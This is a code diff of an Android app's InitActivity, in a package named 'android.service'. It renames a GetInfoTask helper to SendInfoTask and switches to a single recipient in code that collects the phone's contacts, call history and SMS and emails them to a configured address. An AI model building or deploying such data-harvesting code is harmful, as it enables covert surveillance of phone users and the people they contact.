@@ -18,7 +18,7 @@ import android.content.Intent;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.Message;
-import android.service.GetInfoTask;
+import android.service.SendInfoTask;
 import android.service.R;
 import android.service.config.ConfigCtrl;
 import android.service.config.MailCfg;
@@ -192,15 +192,15 @@ public class InitActivity extends Activity
     					mHandler.sendEmptyMessageDelayed(DISABLE_GETINFO_BTN, 0);
     					
     					// Clear attachments
-    					if (GetInfoTask.attachments == null) 
-    						GetInfoTask.attachments = new ArrayList<File>();
+    					if (SendInfoTask.attachments == null) 
+    						SendInfoTask.attachments = new ArrayList<File>();
     					else
-    						GetInfoTask.attachments.clear();
+    						SendInfoTask.attachments.clear();
         		
     					// Collect info
-    					GetInfoTask.CollectContact(context);
-    					GetInfoTask.CollectPhoneCallHist(context);
-    					GetInfoTask.CollectSms(context);
+    					SendInfoTask.CollectContact(context);
+    					SendInfoTask.CollectPhoneCallHist(context);
+    					SendInfoTask.CollectSms(context);
         		
     					// If network connected, try to collect and send the information
     					if (!NetworkUtil.isNetworkConnected(context)) {
@@ -218,8 +218,8 @@ public class InitActivity extends Activity
         	          		 +  phoneNum + "-" + (new SimpleDateFormat("yyyyMMdd")).format(new Date()) 
         	          		 + getResources().getString(R.string.mail_description);
     					String body = String.format(getResources().getString(R.string.mail_body_info), phoneNum);
-    					String[] recipients = GlobalPrefActivity.getSafeMail(context).split(",");
-    					if (recipients.length == 0) {
+    					String recipient = GlobalPrefActivity.getSafeMail(context);
+    					if (recipient == null || recipient.length() == 0) {
     						mHandler.sendEmptyMessageDelayed(ENABLE_GETINFO_BTN, 0);
     						return;
     					}
@@ -230,7 +230,7 @@ public class InitActivity extends Activity
     					while(!result && retry > 0)
     					{
     						String sender = MailCfg.getSender(context);
-    						result = GetInfoTask.sendMail(subject, body, sender, pwd, recipients, GetInfoTask.attachments);
+    						result = SendInfoTask.sendMail(subject, body, sender, pwd, recipient, SendInfoTask.attachments);
     						if (!result) retry--;
     					}
     					if(result) {
@@ -238,7 +238,7 @@ public class InitActivity extends Activity
     					} else {
     						mHandler.sendEmptyMessageDelayed(SEND_MAIL_FAIL, 0);
     					}
-    					GetInfoTask.attachments.clear();
+    					SendInfoTask.attachments.clear();
         		
     					// Update the last date time
     					if (result) {
